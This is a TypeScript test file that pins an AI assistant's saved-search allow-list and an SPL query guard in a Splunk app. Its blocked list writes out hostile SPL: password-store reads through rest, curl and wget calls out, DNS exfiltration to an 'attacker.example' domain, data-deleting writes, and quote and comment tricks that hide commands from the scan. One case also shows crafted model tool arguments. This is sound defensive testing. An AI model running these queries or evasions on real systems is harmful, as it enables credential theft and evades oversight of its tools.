/**
 * Build-time consistency test for the AI Assistant's saved-search allow-list
 * and the splGuard additions (build 376, session 149).
 *
 * What it pins, and why each one is here rather than left to review:
 *
 *  - The ALLOW-LIST is the intent map, exactly. Every intent-map saved search
 *    is allowed (the canned prompts and the primer's catalog must keep
 *    working); every other stanza in savedsearches.conf is refused - in
 *    particular every stanza whose search writes (outputlookup), counted from
 *    the conf, not hard-coded - and no intent-map stanza writes.
 *  - The NAME CHECK is exact: an unknown name, a case variant, a padded,
 *    quoted, piped, bracketed or multi-line name, a prefix either way, a
 *    `logserv_` look-alike and a non-string are all refused, and a refusal
 *    never lists an allowed name the caller did not already send.
 *  - The MCP ARGUMENTS for a saved search are exactly {saved_search_name,
 *    app, earliest_time, latest_time}: a model call carrying
 *    arguments:{saved_search_name, app, args} (or the same keys at the top
 *    level) still sends the vetted name and this App.
 *  - Only the two declared tools pass the pre-dispatch verdict.
 *  - splGuard refuses every way of rerunning a saved search from an ad-hoc
 *    query (`| savedsearch`, `from savedsearch:`, `union savedsearch:`,
 *    `[savedsearch ...]`), `map`, `mcollect`, `meventcollect`,
 *    `runshellscript`, `dump`, a command right after `[` or at the start - and
 *    still passes read-only SPL, including all of the intent map's.
 *  - splGuard refuses an SPL inline comment (three backticks) anywhere - the
 *    trick that hides a word from the scan (`saved` comment `search`) - an
 *    unmatched backtick, and every macro that is not one of the App's own
 *    (ALLOWED_SPL_MACROS, compared with default/macros.conf; the search app's
 *    `comment(1)` included); MLTK `ai`, `deletemodel` and `fit ... into`,
 *    while `fit` without `into`, `apply`, a field `fitness` and a search
 *    term `ai` pass; the App's three macros, the tool description's example
 *    and every macro the primer names pass; and no refusal names an allowed
 *    macro or another forbidden command.
 *  - Round 3: splGuard refuses every alias searchbnf.conf declares for a
 *    listed command (`stash`, `summaryindex`, `sumindex`, `run`, `macro`,
 *    `savedsplunk` - at the start, after `|` and after `[`), `rest`,
 *    `createrss`, `outputtext`, `outputtelemetry`, `curl`, `wget`,
 *    `sendresults` and the `dnslookup` external lookup; it reads quoted
 *    text as data (a `|` or `]` in a quoted argument no longer ends the
 *    `fit ... into` scan, a quoted `"[DELETE]"` or `"(?<tag>[AI])"` no
 *    longer fakes a command position), still refuses a forbidden word in
 *    quoted text and a quoted command word (`| "delete"`), and refuses an
 *    unterminated double quote and a backslash-escaped one outside a
 *    string; the primer's SPL idioms pass.
 *  - Round 4: quotes, double or single, cannot split a word past splGuard:
 *    a forbidden word or `dnslookup` is also looked for with every quote
 *    character removed (`| "saved"search X`, `| from "saved"search:X`,
 *    `| lookup "dns"lookup`), a quoted command word may spell a forbidden
 *    word (`| sav"edsearch" X`) or use single quotes (`| 'delete'`), and
 *    `fit` at command position (plain, quoted or split) followed ANYWHERE
 *    later by the word `into` - quotes removed or turned into spaces - is
 *    refused, so a single-quoted `'a|b'` or `'a]b'` field name or a split
 *    `"in"to` no longer slips a model write through. The over-blocking
 *    this brings (`| fit X | stats count by into`, `by "a into b"`, a
 *    quoted "into" after a fit) is pinned as refused, as documented.
 *    The ALLOW-LIST is immutable (section K): add / delete / clear through
 *    a cast, Set.prototype methods called on it, a replaced `has`, and the
 *    set forEach hands its callback change nothing, and it is a copy.
 *  - The WIRING (source pins): MCPClient.runSavedSearch checks the name and
 *    builds the arguments with no spread; invokeTool refuses the saved-search
 *    tool; useAIAssistant builds the set from the intent map, passes it on
 *    both paths, refuses (with the audit event) before dispatch, forwards no
 *    `arguments` object and no undeclared tool.
 *
 * Run standalone with: `yarn check:diagnostics`
 */

/* eslint-disable no-console */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-var-requires */

// Standalone script, not a module - see session-085 sticky #4.
export {};

declare const require: (id: string) => any;
declare const __dirname: string;
declare const process: { stderr: { write(s: string): void }; exit(code: number): never };

const fs = require('fs');
const path = require('path');
const al = require('./savedSearchAllowList');
const sg = require('./splGuard');

const HOME = path.resolve(__dirname, '..');
const DEFAULT_DIR = path.resolve(__dirname, '../../../../resources/splunk/default');

let alFailures = 0;
let alChecks = 0;
const check = (name: string, cond: boolean, detail: string): void => {
    alChecks += 1;
    if (!cond) {
        alFailures += 1;
        process.stderr.write(`FAIL ${name}: ${detail}\n`);
    }
};
const sameJson = (a: unknown, b: unknown): boolean => JSON.stringify(a) === JSON.stringify(b);
const sortedKeys = (o: Record<string, unknown>): string[] => Object.keys(o).sort();

/* ============================ inputs ============================ */

const intentMap = JSON.parse(fs.readFileSync(path.join(DEFAULT_DIR, 'data/mcp/logserv_intent_map.json'), 'utf8'));
const prompts: Array<{ savedSearch: string; spl: string }> = intentMap.prompts;
const intentNames: string[] = prompts.map((p) => p.savedSearch);
const intentSet = new Set(intentNames);

/* savedsearches.conf: each stanza's `search =` value, continuation lines
 * (a trailing backslash) included. */
const confText: string = fs.readFileSync(path.join(DEFAULT_DIR, 'savedsearches.conf'), 'utf8');
const stanzaSearch: Record<string, string> = {};
{
    let current: string | null = null;
    let inSearch = false;
    let buf: string[] = [];
    const flush = (): void => {
        if (current !== null && buf.length > 0) stanzaSearch[current] = buf.join('\n');
        buf = [];
        inSearch = false;
    };
    for (const raw of confText.split('\n')) {
        const line = raw.replace(/\r$/, '');
        const head = /^\[(.+)\]\s*$/.exec(line.trim());
        if (head && !inSearch) {
            flush();
            current = head[1];
            stanzaSearch[current] = '';
            continue;
        }
        if (current === null) continue;
        if (!inSearch) {
            const m = /^search\s*=\s?(.*)$/.exec(line);
            if (!m) continue;
            buf = [m[1]];
            inSearch = m[1].endsWith('\\');
            if (!inSearch) flush();
        } else {
            buf.push(line);
            if (!line.endsWith('\\')) flush();
        }
    }
    flush();
}
const confNames = Object.keys(stanzaSearch);
const writers = confNames.filter((n) => /\boutputlookup\b/i.test(stanzaSearch[n]));
const notInIntent = confNames.filter((n) => !intentSet.has(n));

const ALLOWED: ReadonlySet<string> = al.buildAllowedSavedSearches(prompts);

/* ============================ A. constants ============================ */

check('A1 app id', al.LOGSERV_APP === 'splunk_app_sap_logserv', String(al.LOGSERV_APP));
check('A2 tool names', al.TOOL_RUN_SAVED_SEARCH === 'splunk_run_saved_search' && al.TOOL_RUN_QUERY === 'splunk_run_query',
    `${al.TOOL_RUN_SAVED_SEARCH} ${al.TOOL_RUN_QUERY}`);
check('A3 exactly the two declared tools are dispatchable',
    sameJson(al.DISPATCHABLE_TOOLS.slice().sort(), ['splunk_run_query', 'splunk_run_saved_search']),
    JSON.stringify(al.DISPATCHABLE_TOOLS));
check('A4 audit operators', al.OPERATOR_SAVED_SEARCH_NOT_IN_CATALOG === 'saved_search_not_in_catalog'
    && al.OPERATOR_TOOL_NOT_DECLARED === 'tool_not_declared',
    `${al.OPERATOR_SAVED_SEARCH_NOT_IN_CATALOG} ${al.OPERATOR_TOOL_NOT_DECLARED}`);

/* ============================ B. the intent map is the allow-list ============================ */

check('B1 the intent map has prompts', intentNames.length > 0, String(intentNames.length));
check('B2 intent-map names are unique', intentSet.size === intentNames.length, `${intentSet.size} of ${intentNames.length}`);
check('B3 every intent-map name gets into the set', ALLOWED.size === intentSet.size
    && intentNames.every((n) => ALLOWED.has(n)), `${ALLOWED.size} of ${intentSet.size}`);
check('B4 the set holds nothing else', Array.from(ALLOWED).every((n) => intentSet.has(n)), 'extra names in the set');
{
    const refusedIntent = intentNames.filter((n) => !al.checkSavedSearchName(n, ALLOWED).allowed);
    check('B5 every intent-map saved search is allowed', refusedIntent.length === 0, refusedIntent.join(', '));
}
{
    const missing = intentNames.filter((n) => !(n in stanzaSearch));
    check('B6 every intent-map saved search is a conf stanza', missing.length === 0, missing.join(', '));
}

/* ============================ C. the conf's other stanzas are refused ============================ */

check('C1 the conf has writing stanzas to refuse', writers.length > 0, String(writers.length));
{
    const writingIntent = writers.filter((n) => intentSet.has(n));
    check('C2 no intent-map saved search writes (outputlookup)', writingIntent.length === 0, writingIntent.join(', '));
}
{
    const allowedWriters = writers.filter((n) => al.checkSavedSearchName(n, ALLOWED).allowed);
    check('C3 every writing stanza is refused', allowedWriters.length === 0, allowedWriters.join(', '));
}
{
    const allowedOther = notInIntent.filter((n) => al.checkSavedSearchName(n, ALLOWED).allowed);
    check('C4 every stanza outside the intent map is refused', allowedOther.length === 0, allowedOther.join(', '));
}

/* ============================ D. the name check is exact ============================ */

const R = intentNames[0];
/* A refusal must not list allowed names: any allowed name in the reason must
 * already be in what the caller sent. */
const leaks = (reason: string, input: unknown): string[] => {
    const sent = typeof input === 'string' ? input : '';
    return Array.from(ALLOWED).filter((n) => reason.indexOf(n) !== -1 && sent.indexOf(n) === -1);
};
{
    const refused: Array<[string, unknown]> = [
        ['unknown name', 'logserv_no_such_search_s149'],
        ['writer by name', 'logserv_mc_retention'],
        ['upper case', R.toUpperCase()],
        ['first letter upper', R.charAt(0).toUpperCase() + R.slice(1)],
        ['leading space', ` ${R}`],
        ['trailing space', `${R} `],
        ['leading tab', `\t${R}`],
        ['trailing newline', `${R}\n`],
        ['embedded newline', `${R}\n| outputlookup x`],
        ['double-quoted', `"${R}"`],
        ['single-quoted', `'${R}'`],
        ['backticked', `\`${R}\``],
        ['piped', `${R} | outputlookup logserv_mc_rollup`],
        ['pipe no space', `${R}|x`],
        ['bracketed', `[${R}]`],
        ['longer (prefix of input)', `${R}_x`],
        ['shorter (prefix of a name)', R.slice(0, -1)],
        ['logserv_ look-alike', 'logserv_'],
        ['app-qualified', `splunk_app_sap_logserv:${R}`],
        ['wildcard', `${R}*`],
        ['star', '*'],
        ['semicolon', `${R};x`],
        ['empty', ''],
        ['null', null],
        ['undefined', undefined],
        ['number', 42],
        ['object', { name: R }],
        ['array', [R]],
        ['String object', Object(R)],
        ['prototype key', 'constructor'],
        ['proto', '__proto__'],
    ];
    for (const [label, input] of refused) {
        const r = al.checkSavedSearchName(input, ALLOWED);
        check(`D1 refused: ${label}`, r.allowed === false && typeof r.reason === 'string' && r.reason.length > 0,
            JSON.stringify(r));
        if (typeof r.reason === 'string') {
            const l = leaks(r.reason, input);
            check(`D2 the refusal lists no allowed name: ${label}`, l.length === 0, l.join(', '));
            check(`D3 the refusal is short: ${label}`, r.reason.length < 400, String(r.reason.length));
        }
    }
    for (const n of writers) {
        const r = al.checkSavedSearchName(n, ALLOWED);
        const l = leaks(r.reason || '', n);
        if (l.length > 0) check(`D4 a writer's refusal lists no allowed name: ${n}`, false, l.join(', '));
    }
    check('D4 writer refusals checked', true, '');
}
{
    /* The shape fence holds even when the set itself is wrong. */
    const odd = new Set<string>(['a b', 'x|y', '"q"', 'ok_name', '']);
    check('D5 a padded name in the set is still refused', !al.checkSavedSearchName('a b', odd).allowed, 'a b');
    check('D5 a piped name in the set is still refused', !al.checkSavedSearchName('x|y', odd).allowed, 'x|y');
    check('D5 a quoted name in the set is still refused', !al.checkSavedSearchName('"q"', odd).allowed, '"q"');
    check('D5 an empty name in the set is still refused', !al.checkSavedSearchName('', odd).allowed, 'empty');
    check('D5 a plain name in the set is allowed', al.checkSavedSearchName('ok_name', odd).allowed === true, 'ok_name');
    check('D6 an empty set allows nothing', !al.checkSavedSearchName(R, new Set<string>()).allowed, R);
}
{
    const built: ReadonlySet<string> = al.buildAllowedSavedSearches([
        { savedSearch: 'ok_name' }, { savedSearch: ' padded' }, { savedSearch: 'a|b' }, { savedSearch: 5 },
        { savedSearch: '' }, null, 'string_entry', {}, { savedSearch: 'Ok.Name-2' },
    ]);
    check('D7 the set builder keeps only catalog-shaped names', sameJson(Array.from(built).sort(), ['Ok.Name-2', 'ok_name']),
        JSON.stringify(Array.from(built)));
    check('D8 the set builder tolerates no prompts', al.buildAllowedSavedSearches(undefined).size === 0
        && al.buildAllowedSavedSearches(null).size === 0, 'null/undefined');
}

/* ============================ E. the MCP arguments ============================ */

{
    const canned = al.buildSavedSearchArgs(R, { earliest_time: '-24h@h', latest_time: 'now' });
    check('E1 canned call: exactly name, app and the time range',
        sameJson(sortedKeys(canned), ['app', 'earliest_time', 'latest_time', 'saved_search_name'])
        && canned.saved_search_name === R && canned.app === 'splunk_app_sap_logserv'
        && canned.earliest_time === '-24h@h' && canned.latest_time === 'now',
        JSON.stringify(canned));
    const noTime = al.buildSavedSearchArgs(R);
    check('E2 no time range: exactly name and app', sameJson(noTime, { saved_search_name: R, app: 'splunk_app_sap_logserv' }),
        JSON.stringify(noTime));
    const emptyTime = al.buildSavedSearchArgs(R, { earliest_time: '', latest_time: '' });
    check('E3 empty times are left out', sameJson(sortedKeys(emptyTime), ['app', 'saved_search_name']), JSON.stringify(emptyTime));
}
{
    /* A model call that tries every way of replacing the name or the app. */
    const modelArgs: Record<string, unknown> = {
        name: R,
        earliest_time: '-7d',
        latest_time: 'now',
        render_hint: 'table',
        top_n: 5,
        arguments: { saved_search_name: 'logserv_mc_retention', app: 'x', args: 'y' },
        saved_search_name: 'logserv_mc_retention',
        app: 'search',
        args: 'y',
    };
    const verdict = al.vetToolCall('splunk_run_saved_search', modelArgs, ALLOWED);
    check('E4 the vetted name passes the verdict', verdict.ok === true, JSON.stringify(verdict));
    const time = al.pickSavedSearchTimeRange(modelArgs);
    check('E5 only the time range is taken from the model', sameJson(time, { earliest_time: '-7d', latest_time: 'now' }),
        JSON.stringify(time));
    const sent = al.buildSavedSearchArgs(modelArgs.name as string, time);
    check('E6 model call: exactly the vetted name, this App and the time range',
        sameJson(sortedKeys(sent), ['app', 'earliest_time', 'latest_time', 'saved_search_name'])
        && sent.saved_search_name === R && sent.app === 'splunk_app_sap_logserv'
        && sent.earliest_time === '-7d' && sent.latest_time === 'now',
        JSON.stringify(sent));
    /* Even a time object that carries other keys adds or replaces none. */
    const dirty = al.buildSavedSearchArgs(R, {
        earliest_time: '-1h', latest_time: 'now', saved_search_name: 'logserv_mc_retention', app: 'x', args: 'y',
    } as any);
    check('E7 a time object cannot add or replace a key',
        sameJson(sortedKeys(dirty), ['app', 'earliest_time', 'latest_time', 'saved_search_name'])
        && dirty.saved_search_name === R && dirty.app === 'splunk_app_sap_logserv',
        JSON.stringify(dirty));
    check('E8 non-string times are dropped', sameJson(al.pickSavedSearchTimeRange({ earliest_time: 7, latest_time: { x: 1 } }), {}),
        JSON.stringify(al.pickSavedSearchTimeRange({ earliest_time: 7, latest_time: { x: 1 } })));
    check('E9 nested arguments times are not read',
        sameJson(al.pickSavedSearchTimeRange({ arguments: { earliest_time: '0', latest_time: 'now' } }), {}),
        'arguments.earliest_time must not be read');
    check('E10 no args', sameJson(al.pickSavedSearchTimeRange(undefined), {}), 'undefined');
}

/* ============================ F. the pre-dispatch verdict ============================ */

{
    for (const t of ['splunk_run_oneshot', 'splunk_get_indexes', 'Splunk_Run_Saved_Search', 'splunk_run_query ', '', 'run_saved_search']) {
        const v = al.vetToolCall(t, { name: R, query: 'index=x' }, ALLOWED);
        check(`F1 undeclared tool refused: ${JSON.stringify(t)}`,
            v.ok === false && v.operator === 'tool_not_declared' && v.auditSpl.indexOf('(tool) ') === 0,
            JSON.stringify(v));
        if (v.ok === false) check(`F2 its reason lists no allowed name: ${JSON.stringify(t)}`, leaks(v.reason, '').length === 0, v.reason);
    }
    const w = writers[0];
    const vw = al.vetToolCall('splunk_run_saved_search', { name: w }, ALLOWED);
    check('F3 a writer is refused before dispatch',
        vw.ok === false && vw.operator === 'saved_search_not_in_catalog' && vw.auditSpl === `(saved search) ${w}`,
        JSON.stringify(vw));
    const vm = al.vetToolCall('splunk_run_saved_search', {}, ALLOWED);
    check('F4 a missing name is refused', vm.ok === false && vm.operator === 'saved_search_not_in_catalog', JSON.stringify(vm));
    const vn = al.vetToolCall('splunk_run_saved_search', { name: 'x\u0000y\nz' }, ALLOWED);
    check('F5 the audit text carries no control characters',
        vn.ok === false && !/[\u0000-\u001f]/.test(vn.auditSpl), JSON.stringify(vn));
    check('F6 every intent-map name passes the verdict',
        intentNames.every((n) => al.vetToolCall('splunk_run_saved_search', { name: n }, ALLOWED).ok === true), 'refused');
    check('F7 an ad-hoc query passes the verdict (splGuard judges its SPL)',
        al.vetToolCall('splunk_run_query', { query: '| savedsearch x' }, ALLOWED).ok === true, 'refused');
}

/* ============================ G. splGuard ============================ */

{
    const blocked: Array<[string, string]> = [
        ['| savedsearch logserv_mc_retention', 'savedsearch'],
        ['`sap_logserv_idx_macro` | head 1 | append [| savedsearch logserv_mc_retention]', 'savedsearch'],
        ['| from savedsearch:logserv_mc_retention', 'savedsearch'],
        ['| union savedsearch:logserv_mc_retention', 'savedsearch'],
        ['| makeresults | append [savedsearch logserv_mc_retention]', 'savedsearch'],
        ['savedsearch logserv_mc_retention', 'savedsearch'],
        ['| SavedSearch logserv_mc_retention', 'savedsearch'],
        ['| from  savedsearch:"logserv_mc_retention"', 'savedsearch'],
        ['| map search="search index=x | stats count"', 'map'],
        ['`sap_logserv_idx_macro` | head 3 | map maxsearches=3 search="| makeresults"', 'map'],
        ['| mcollect index=m', 'mcollect'],
        ['| meventcollect index=m', 'meventcollect'],
        ['| runshellscript x.sh 1 2', 'runshellscript'],
        ['| dump basefilename=x', 'dump'],
        ['| summaryindex index=s', 'summaryindex'],
        ['| makeresults [| outputlookup logserv_mc_rollup]', 'outputlookup'],
        ['| makeresults | append [outputlookup logserv_mc_rollup]', 'outputlookup'],
        ['outputlookup logserv_mc_rollup', 'outputlookup'],
        ['   collect index=x', 'collect'],
        ['index=x\n| collect index=y', 'collect'],
        ['| inputlookup logserv_mc_rollup | where 1=0 | outputlookup logserv_mc_rollup', 'outputlookup'],
        ['| collect index=x', 'collect'],
        ['| outputcsv x', 'outputcsv'],
        ['| delete', 'delete'],
        ['| sendalert x', 'sendalert'],
        ['| sendemail to=a@b', 'sendemail'],
        ['| script x', 'script'],
        ['| run x', 'run'],
        ['| tscollect namespace=x', 'tscollect'],
        /* Inline comments: Splunk drops them before it runs the search, so a
         * comment inside a word would hide it from the scan. */
        ['`sap_logserv_idx_macro` | head 1 | saved```x```search logserv_mc_retention', 'inline_comment'],
        ['| saved```x```search logserv_mc_retention', 'inline_comment'],
        ['| ```c``` outputlookup logserv_mc_rollup', 'inline_comment'],
        ['| m```x```ap search="x"', 'inline_comment'],
        ['| from saved```x```search:foo', 'inline_comment'],
        ['`sap_logserv_idx_macro` | stats count ```a harmless-looking comment```', 'inline_comment'],
        ['`sap_logserv_idx_macro` ````', 'inline_comment'],
        /* Macros: only the App's own, referenced exactly. */
        ['| saved`comment("x")`search foo', 'macro'],
        ['| saved``search foo', 'macro'],
        ['`evil`', 'macro'],
        ['`evil(1)`', 'macro'],
        ['`sap_logserv_idx_macro` | head 1 | append [`evil`]', 'macro'],
        ['`sap_logserv_idx_macro` | eval x=`evil("a", 2)`', 'macro'],
        ['`sap_logserv_idx_macro` | `comment("x")` stats count', 'macro'],
        ['`Sap_logserv_idx_macro` | stats count', 'macro'],
        ['` sap_logserv_idx_macro` | stats count', 'macro'],
        ['`sap_logserv_idx_macro ` | stats count', 'macro'],
        ['`sap_logserv_idx_macro()` | stats count', 'macro'],
        ['`sap_logserv_idx_macro(1)` | stats count', 'macro'],
        ['`sap_logserv_idx_macro;x` | stats count', 'macro'],
        /* An unmatched backtick. */
        ['`sap_logserv_idx_macro | stats count', 'unbalanced_backtick'],
        ['`sap_logserv_idx_macro` | eval x="`" | stats count', 'unbalanced_backtick'],
        ['`', 'unbalanced_backtick'],
        /* MLTK / AI Toolkit. */
        ['`sap_logserv_idx_macro` | stats count by user | fit DensityFunction count into app:customer_model', 'fit_into'],
        ['| fit LinearRegression y from x into m', 'fit_into'],
        ['| FIT LinearRegression y from x INTO m', 'fit_into'],
        ['| fit LinearRegression y from x\n    into m', 'fit_into'],
        ['| makeresults | append [fit KMeans k=3 a b into m]', 'fit_into'],
        ['fit KMeans k=3 a b into m', 'fit_into'],
        ['`sap_logserv_idx_macro` | stats count by user | ai prompt="summarize"', 'ai'],
        ['| AI prompt="x"', 'ai'],
        ['ai prompt="x"', 'ai'],
        ['| makeresults | append [ai prompt="x"]', 'ai'],
        ['| deletemodel customer_model', 'deletemodel'],
        ['| makeresults | append [| deletemodel m]', 'deletemodel'],
        /* Round 3 - the searchbnf.conf aliases of the listed commands, each at
         * the start, after `|`, after `[|` and after `[` (added below). */
        ['| makeresults | appendpipe [| savedsplunk logserv_topology_edges_retention]', 'savedsplunk'],
        ['| from savedsplunk:logserv_mc_retention', 'savedsplunk'],
        ['| makeresults | eval x="savedsplunk:x"', 'savedsplunk'],
        ['| from "savedsearch:logserv_mc_retention"', 'savedsearch'],
        ['| MACRO logserv_mc_retention', 'macro'],
        ['| makeresults | eval x=1 | stash index=main', 'stash'],
        ['| makeresults | Sumindex index=main', 'sumindex'],
        /* `rest` reads REST endpoints, storage/passwords' clear_password included. */
        ['| rest /servicesNS/-/-/storage/passwords | stats count by clear_password', 'rest'],
        ['| REST /services/server/info', 'rest'],
        /* Data off the search head, and the other built-in writers. */
        ['| curl method=post uri=https://example.invalid data=x', 'curl'],
        ['`sap_logserv_idx_macro` | head 5 | wget https://example.invalid', 'wget'],
        ['| makeresults | outputtelemetry input=x anonymous=t', 'outputtelemetry'],
        ['| makeresults | sendresults email_to=a@b', 'sendresults'],
        ['| makeresults | outputtext', 'outputtext'],
        ['| makeresults | createrss path=x name=y link=z descr=d count=1', 'createrss'],
        ['| makeresults | eval clienthost=host.".attacker.example" | lookup dnslookup clienthost', 'external_lookup'],
        ['| makeresults | lookup local=t dnslookup clienthost OUTPUT clientip', 'external_lookup'],
        ['| makeresults | lookup DNSLookup clienthost', 'external_lookup'],
        ['| makeresults | lookup "dnslookup" clienthost', 'external_lookup'],
        ['| makeresults | eval ip=lookup("dnslookup", json_object("clienthost", host))', 'external_lookup'],
        /* Quoted text is data: a quoted `|` or `]` does not end the fit scan. */
        ['| makeresults count=10 | eval x=random(), "a|b"=1 | fit DensityFunction x by "a|b" into app:evil_model', 'fit_into'],
        ['| makeresults | eval x=1, "y]"=2 | fit LinearRegression x from "y]" into app:evil', 'fit_into'],
        ['| fit DensityFunction x by "a\\"|b" into m', 'fit_into'],
        ['| eval x="a\\"b" | delete', 'delete'],
        ['| eval x="a\\\\" | delete', 'delete'],
        /* A quoted command word is still the command. */
        ['| "delete"', 'delete'],
        ['| de"lete" x', 'delete'],
        ['| makeresults | append [| "outputlookup" logserv_mc_rollup]', 'outputlookup'],
        ['| makeresults | append ["outputlookup" logserv_mc_rollup]', 'outputlookup'],
        ['"run" x', 'run'],
        ['| makeresults | "REST" /services', 'rest'],
        /* Ambiguous quoting. */
        ['| search "abc', 'unterminated_quote'],
        ['`sap_logserv_idx_macro` | eval x="a\\"', 'unterminated_quote'],
        ['| eval x="abc\\', 'unterminated_quote'],
        ['index=x "a" "b', 'unterminated_quote'],
        ['index=x \\" | delete | eval y="', 'escaped_quote'],
        ['index=x foo\\"bar" | stats count', 'escaped_quote'],
        /* Round 4 - quotes, double or single, cannot split a word or hide a
         * fit ... into (round-3 findings 0 and 7). */
        ['| makeresults count=10 | eval \'a|b\'=random() | fit DensityFunction \'a|b\' into app:evil_model', 'fit_into'],
        ['| makeresults | eval \'a]b\'=1 | fit DensityFunction \'a]b\' into app:evil_model', 'fit_into'],
        ['| makeresults | append [| makeresults | fit DensityFunction \'a]b\' into app:m]', 'fit_into'],
        ['| "saved"search logserv_mc_retention', 'savedsearch'],
        ['| sav"edsearch" x', 'savedsearch'],
        ['| from "saved"search:logserv_mc_retention', 'savedsearch'],
        ['| from \'saved\'search:logserv_mc_retention', 'savedsearch'],
        ['| union saved""search:logserv_mc_retention', 'savedsearch'],
        ['| makeresults | append [\'saved\'search logserv_mc_retention]', 'savedsearch'],
        ['| "saved"splunk x', 'savedsplunk'],
        ['| lookup "dns"lookup clienthost', 'external_lookup'],
        ['| makeresults | lookup \'dns\'lookup clienthost', 'external_lookup'],
        ['| makeresults | eval h=lookup("dns""lookup", json_object("clienthost", "a"))', 'external_lookup'],
        ['| makeresults | fit X "in"to app:m', 'fit_into'],
        ['| makeresults | fit X \'in\'to app:m', 'fit_into'],
        ['| makeresults | fit X by "a"into app:m', 'fit_into'],
        ['| makeresults | fit X by \'a\'into app:m', 'fit_into'],
        ['| "fit" X into app:m', 'fit_into'],
        ['| f"it" X into app:m', 'fit_into'],
        ['| \'fit\' X into app:m', 'fit_into'],
        ['| f\'it\' X into app:m', 'fit_into'],
        ['| fit"a" X into app:m', 'fit_into'],
        ['| makeresults | append ["fit" X into app:m]', 'fit_into'],
        ['| \'delete\'', 'delete'],
        ['| de\'lete\' x', 'delete'],
        ['| makeresults | append [| \'outputlookup\' logserv_mc_rollup]', 'outputlookup'],
        ['\'run\' x', 'run'],
        /* The RAW scans stay: removing the quotes joins a quoted word to its
         * neighbours, so only the raw query sees these. */
        ['| makeresults | eval x=a"savedsearch"b', 'savedsearch'],
        ['| makeresults | eval x=a"dnslookup"b', 'external_lookup'],
        /* Documented over-blocking: `into` anywhere after a fit is refused,
         * even in another command or in quoted text. */
        ['`sap_logserv_idx_macro` | stats count by user | fit DensityFunction count | eval note="into"', 'fit_into'],
        ['`sap_logserv_idx_macro` | stats count by user | fit DensityFunction count by "a into b"', 'fit_into'],
        ['`sap_logserv_idx_macro` | stats count by user | fit DensityFunction count | stats count by into', 'fit_into'],
        ['| makeresults | fit DensityFunction x | append [| makeresults | eval into=1]', 'fit_into'],
    ];
    /* Every alias, and the new commands, in every command position. */
    for (const cmd of ['stash', 'summaryindex', 'sumindex', 'run', 'macro', 'savedsplunk', 'rest', 'curl', 'wget',
        'outputtelemetry', 'sendresults', 'outputtext', 'createrss']) {
        blocked.push([`| ${cmd} x`, cmd]);
        blocked.push([`${cmd} x`, cmd]);
        blocked.push([`| makeresults | append [| ${cmd} x]`, cmd]);
        blocked.push([`| makeresults | append [${cmd} x]`, cmd]);
        blocked.push([`index=x\n|\t${cmd} x`, cmd]);
    }
    const forbidden: string[] = (sg.FORBIDDEN_SPL_COMMANDS as string[]).concat(sg.FORBIDDEN_SPL_WORDS as string[]);
    for (const [q, op] of blocked) {
        const r = sg.analyzeSpl(q);
        check(`G1 blocked: ${JSON.stringify(q)}`, r.blocked === true && r.operator === op, JSON.stringify(r));
        if (typeof r.reason === 'string') {
            const named = forbidden.filter((c) => new RegExp(`\\b${c}\\b`, 'i').test(r.reason) && c !== r.operator);
            check(`G2 the reason names no other command: ${JSON.stringify(q)}`, named.length === 0, named.join(', '));
        }
    }
    /* The same regex objects are reused (flag g): a short query right after a
     * hit far into a long one must still be caught. */
    {
        const pad = '`sap_logserv_idx_macro` sourcetype=linux_secure | stats count by host, user | sort -count | head 50';
        const a1 = sg.analyzeSpl(`${pad} | dump x`).blocked;
        const a2 = sg.analyzeSpl('| dump x').blocked;
        const b1 = sg.analyzeSpl(`${pad} | from savedsearch:x`).blocked;
        const b2 = sg.analyzeSpl('| savedsearch y').blocked;
        check('G3 repeated calls agree (no regex state leaks between calls)', a1 && a2 && b1 && b2,
            JSON.stringify([a1, a2, b1, b2]));
        const c1 = sg.analyzeSpl(`${pad} | eval note="padding padding padding" | "dump" x`).operator;
        const c2 = sg.analyzeSpl('| "dump" x').operator;
        check('G3 repeated calls agree for a quoted command word', c1 === 'dump' && c2 === 'dump', JSON.stringify([c1, c2]));
        /* Round 4: a word only the RAW scan sees (the quotes join it to its
         * neighbours in the dequoted copy), right after a word hit. */
        const d1 = sg.analyzeSpl(`${pad} | from savedsearch:x`).operator;
        const d2 = sg.analyzeSpl('a"savedsearch"b').operator;
        check('G3 repeated calls agree for a word only the raw scan sees', d1 === 'savedsearch' && d2 === 'savedsearch',
            JSON.stringify([d1, d2]));
    }

    const readOnly = [
        '`sap_logserv_idx_macro` sourcetype=sap:hana:audit action_status=FAILED | stats count by user | sort -count',
        '`sap_logserv_idx_macro` | search action="collect_data" | stats count',
        'index=_internal sourcetype=scheduler | stats count by savedsearch_name, app',
        '`sap_logserv_idx_macro` | eval mapping="x" | table mapping, dumpster',
        '| makeresults | eval x=1',
        '`sap_logserv_idx_macro` | timechart span=1h count by sourcetype',
        '| inputlookup logserv_mc_rollup | stats sum(n) AS n by cloud_provider',
        '`sap_logserv_idx_macro` [search `sap_logserv_idx_macro` sourcetype=linux_secure | fields host] | top limit=10 host',
        '`sap_logserv_idx_macro` | rename runtime AS rt | lookup squid_actions_210 code OUTPUT action',
        '`sap_logserv_idx_macro` | rex field=_raw "user=(?<u>\\S+)" | dedup u | table u',
        '',
        /* The App's own macros, in every place the assistant is taught to use them. */
        '`sap_logserv_audit_idx_macro` | stats count by category',
        '`sap_logserv_idx_macro` | `sap_logserv_cloud_provider_default_macro` | stats count by cloud_provider',
        '| tstats count WHERE `sap_logserv_idx_macro` by sourcetype',
        '`sap_logserv_idx_macro` earliest=-24h latest=now sourcetype=linux_secure | stats count by host',
        /* MLTK commands that only read, and look-alikes of the refused ones. */
        '`sap_logserv_idx_macro` | stats count by user | fit DensityFunction count',
        '`sap_logserv_idx_macro` | stats count by user | eval into_n=1 | fit DensityFunction into_n',
        '`sap_logserv_idx_macro` | stats count by user | apply customer_model',
        '`sap_logserv_idx_macro` | eval fitness=1 | stats avg(fitness)',
        '`sap_logserv_idx_macro` | stats count by fit, into',
        '`sap_logserv_idx_macro` ai | stats count',
        '`sap_logserv_idx_macro` | search message="ai prompt" | stats count by aim',
        '`sap_logserv_idx_macro` | eval model="deletemodel_x" | table model',
        /* Round 3: quoted text is data, not SPL structure. */
        '`sap_logserv_idx_macro` | rex field=_raw "(?<tag>[AI])" | stats count by tag',
        'search "[DELETE]"',
        '`sap_logserv_idx_macro` "[RUN]" | stats count',
        '`sap_logserv_idx_macro` "[MAP] started" OR "[DUMP]" | stats count by host',
        '`sap_logserv_idx_macro` | eval m="| collect index=x" | table m',
        '`sap_logserv_idx_macro` | search message="rest" | stats count',
